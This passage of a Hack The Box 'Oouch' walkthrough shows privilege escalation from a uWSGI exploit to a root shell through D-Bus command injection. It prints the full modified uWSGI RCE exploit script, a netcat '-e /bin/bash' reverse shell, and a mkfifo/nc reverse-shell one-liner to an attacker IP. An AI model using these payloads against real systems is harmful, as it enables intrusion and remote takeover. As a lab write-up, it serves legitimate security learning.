qtc         88  0.0  0.0   7640  2788 pts/0    R+   04:43   0:00 ps aux
```

> **What is uWSGI?** uWSGI is a software application that "aims at developing a full stack for building hosting services". It is named after the Web Server Gateway Interface, which was the first plugin supported by the project

I checked its version

```bash
qtc@aeb4525789d8:/code$ uwsgi --version
2.0.17.1
```

I searched for any exploits available for it and found this.

> [https://github.com/wofeiwo/webcgi-exploits](https://github.com/wofeiwo/webcgi-exploits)

I tried the python exploit and checking help reveals that we need to add these options while execution and I checked if `/tmp/uwsgi.sock` is present and socket file is saved in `/tmp/uwsgi.socket`. So Its time to upload.

```bash
root@kali:~/CTF/HTB/Boxes/Oouch# python exploit.py --help
usage: exploit.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]

This is a uwsgi client & RCE exploit. Last modifid at 2018-01-30 by
wofeiwo@80sec.com

optional arguments:
  -h, --help            show this help message and exit
  -m [{http,tcp,unix}], --mode [{http,tcp,unix}]
                        Uwsgi mode: 1. http 2. tcp 3. unix. The default is
                        tcp.
  -u [UWSGI_ADDR], --uwsgi [UWSGI_ADDR]
                        Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock
  -c [COMMAND], --command [COMMAND]
                        Command: The exploit command you want to execute, must
                        have this.

Example：uwsgi_exp.py -u 1.2.3.4:5000 -c "echo 111>/tmp/abc"
```

The Docker doesn't contain `wget` so I first uploaded it to the normal box and by using `scp` I transferred to the Docker.

```bash
qtc@oouch:~$ wget http://10.10.14.9:8000/exploit.py
--2020-06-09 08:01:59--  http://10.10.14.9:8000/exploit.py
Connecting to 10.10.14.9:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4427 (4.3K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                    100%[===============================================>]   4.32K  --.-KB/s    in 0.02s   

2020-06-09 08:02:00 (219 KB/s) - ‘exploit.py’ saved [4427/4427]

qtc@oouch:~$ scp -i .ssh/id_rsa exploit.py qtc@172.18.0.3:/tmp/
exploit.py                                                                                                                                   100% 4427     7.3MB/s   00:00
```

I tried running the script and I get an error.

```bash
qtc@aeb4525789d8:/tmp$ python3 exploit.py -m unix -u /tmp/uwsgi.socket -c 'whoami'
[*]Sending payload.
Traceback (most recent call last):
  File "exploit.py", line 146, in [module](module)
    main()
  File "exploit.py", line 143, in main
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
  File "exploit.py", line 110, in curl
    return ask_uwsgi(addr_and_port, mode, var)
  File "exploit.py", line 77, in ask_uwsgi
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
  File "exploit.py", line 26, in pack_uwsgi_vars
    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
  File "exploit.py", line 18, in sz
    if sys.version_info[0] == 3: import bytes
ModuleNotFoundError: No module named 'bytes'
```

So the box doesn't have `bytes` module and we can't do pip install kinds of stuff. 

So I did a few changes in the script.

```python
#!/usr/bin/python

import sys
import socket
import argparse
import binascii
import requests

def sz(x):
    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
    s = bytes.fromhex(s) if sys.version_info[0] == 3 else binascii.hexlify(s)
    return s[::-1]

def pack_uwsgi_vars(var):
    pk = b''
    for k, v in var.items() if hasattr(var, 'items') else var:
        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
    result = b'\x00' + sz(pk) + b'\x00' + pk
    return result

def parse_addr(addr, default_port=None):
    port = default_port
    if isinstance(addr, str):
        if addr.isdigit():
            addr, port = '', addr
        elif ':' in addr:
            addr, _, port = addr.partition(':')
    elif isinstance(addr, (list, tuple, set)):
        addr, port = addr
    port = int(port) if port else port
    return (addr or '127.0.0.1', port)

def get_host_from_url(url):
    if '//' in url:
        url = url.split('//', 1)[1]
    host, _, url = url.partition('/')
    return (host, '/' + url)

def fetch_data(uri, payload=None, body=None):
    if 'http' not in uri:
        uri = 'http://' + uri
    s = requests.Session()
    # s.headers['UWSGI_FILE'] = payload
    if body:
        import urlparse
        body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path))
        d = s.post(uri, data=body_d)
    else:
        d = s.get(uri)

    return {
        'code': d.status_code,
        'text': d.text,
        'header': d.headers
    }

def ask_uwsgi(addr_and_port, mode, var, body=''):
    if mode == 'tcp':
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(parse_addr(addr_and_port))
    elif mode == 'unix':
        s = socket.socket(socket.AF_UNIX)
        s.connect(addr_and_port)
    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
    response = []
    # Actually we dont need the response, it will block if we run any commands.
    # So I comment all the receiving stuff. 
    # while 1:
    #     data = s.recv(4096)
    #     if not data:
    #         break
    #     response.append(data)
    s.close()
    return b''.join(response).decode('utf8')

def curl(mode, addr_and_port, payload, target_url):
    host, uri = get_host_from_url(target_url)
    path, _, qs = uri.partition('?')
    if mode == 'http':
        return fetch_data(addr_and_port+uri, payload)
    elif mode == 'tcp':
        host = host or parse_addr(addr_and_port)[0]
    else:
        host = addr_and_port
    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'REQUEST_METHOD': 'GET',
        'PATH_INFO': path,
        'REQUEST_URI': uri,
        'QUERY_STRING': qs,
        'SERVER_NAME': host,
        'HTTP_HOST': host,
        'UWSGI_FILE': payload,
        'SCRIPT_NAME': target_url
    }
    return ask_uwsgi(addr_and_port, mode, var)

def main(*args):
    desc = """
    This is a uwsgi client & RCE exploit.
    Last modifid at 2018-01-30 by wofeiwo@80sec.com
    """
    elog = "Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \"echo 111>/tmp/abc\""
    
    parser = argparse.ArgumentParser(description=desc, epilog=elog)

    parser.add_argument('-m', '--mode', nargs='?', default='tcp',
                        help='Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.',
                        dest='mode', choices=['http', 'tcp', 'unix'])

    parser.add_argument('-u', '--uwsgi', nargs='?', required=True,
                        help='Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock',
                        dest='uwsgi_addr')

    parser.add_argument('-c', '--command', nargs='?', required=True,
                        help='Command: The exploit command you want to execute, must have this.',
                        dest='command')

    if len(sys.argv) < 2:
        parser.print_help()
        return
    args = parser.parse_args()
    if args.mode.lower() == "http":
        print("[-]Currently only tcp/unix method is supported in RCE exploit.")
        return
    payload = 'exec://' + args.command + "; echo test" # must have someting in output or the uWSGI crashs.
    print("[*]Sending payload.")
    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))

if __name__ == '__main__':
    main()
```

And Copied the new edited script in the same way and this time I uploaded `nc` to the docker too.

```bash
qtc@aeb4525789d8:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c '/tmp/nc -e /bin/bash 10.10.14.9 8080'
[*]Sending payload.
```

Im now `www-data`

![Untitled](/img/htb-oouch/Untitled%2029.png)

Now time for dbus exploitation.

### D-Bus Exploitation

[http://www.kaizou.org/2014/06/dbus-command-line.html](http://www.kaizou.org/2014/06/dbus-command-line.html)

[https://linux.die.net/man/1/dbus-send](https://linux.die.net/man/1/dbus-send)

After lot of enumeration and using those articles, I found a way to get reverse shell as root.

```python
$ dbus-send --system --type=method_call --print-reply --dest=htb.oouch.Block /htb/oouch/Block org.freedesktop.DBus.Introspectable.Introspect
dbus-send --system --type=method_call --print-reply --dest=htb.oouch.Block /htb/oouch/Block org.freedesktop.DBus.Introspectable.Introspect
method return time=1591687819.038208 sender=:1.3 -> destination=:1.3209 serial=10 reply_serial=2
   string "<!DOCTYPE node PUBLIC "-//freedesktop//DTD D-BUS Object Introspection 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/introspect.dtd">
[node](node)
 [interface name="org.freedesktop.DBus.Peer"](interface name="org.freedesktop.DBus.Peer")
  [method name="Ping"/](method name="Ping"/)
  [method name="GetMachineId"](method name="GetMachineId")
   [arg type="s" name="machine_uuid" direction="out"/](arg type="s" name="machine_uuid" direction="out"/)
  [/method](/method)
 [/interface](/interface)
.
.
.
 [interface name="htb.oouch.Block"](interface name="htb.oouch.Block")
  [method name="Block"](method name="Block")
   [arg type="s" direction="in"/](arg type="s" direction="in"/)
   [arg type="s" direction="out"/](arg type="s" direction="out"/)
  [/method](/method)
 [/interface](/interface)
[/node](/node)
```

First We need to get the Interface name and method name. And we got them both.

Now mix them up and I got the payload.

```python
dbus-send --system --type=method_call --dest=htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block "string:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f;"
```

### Getting Root

By running the payload as `www-data` and my nc listener is started and I got shell as root.

```python
root@kali:~/CTF/HTB/Boxes/Oouch# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.177] 38992
bash: cannot set terminal process group (2717): Inappropriate ioctl for device
bash: no job control in this shell
root@oouch:/root# whoami
whoami
root
root@oouch:/root# ls   
ls
credits.txt
dbus-server
dbus-server.c
get_pwnd.log
get_pwnd.py
root.txt
root@oouch:/root# cat root.txt	
cat root.txt
```

We own the box.